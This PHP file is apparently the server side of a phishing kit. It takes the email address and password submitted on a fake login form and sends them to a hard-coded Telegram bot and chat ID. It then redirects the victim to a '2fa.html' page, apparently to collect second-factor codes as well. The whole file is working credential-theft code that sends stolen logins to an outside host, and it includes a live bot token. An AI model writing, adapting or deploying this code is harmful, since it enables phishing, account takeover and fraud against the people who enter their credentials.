<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Retrieve the form data
    $email = $_POST["email"];
    $password = $_POST["password"];

    // Send data to Telegram
    $telegramBotToken = '6521884473:AAEd3XCqFN_d5DXW8VOrGcgx8hHFwQJZCno';
    $chatId = '5508958154';
    $message = "New Login\nEmail: $email\nPassword: $password";

    $telegramApiUrl = "https://api.telegram.org/bot$telegramBotToken/sendMessage";
    $telegramApiUrl .= "?chat_id=$chatId&text=" . urlencode($message);

    // Use cURL to send a POST request to Telegram
    $ch = curl_init($telegramApiUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    
    $response = curl_exec($ch);

    if ($response === false) {
        // cURL request failed
        echo "Error sending message to Telegram: " . curl_error($ch);
    } else {
        // Check Telegram API response for any errors
        $telegramData = json_decode($response, true);

        if (!$telegramData || !$telegramData["ok"]) {
            echo "Error from Telegram API: " . $telegramData["description"];
        } else {
            // Redirect to the 2fa.html page
            header("Location:2fa.html");
            exit();
        }
    }

    curl_close($ch);
}
?>
	
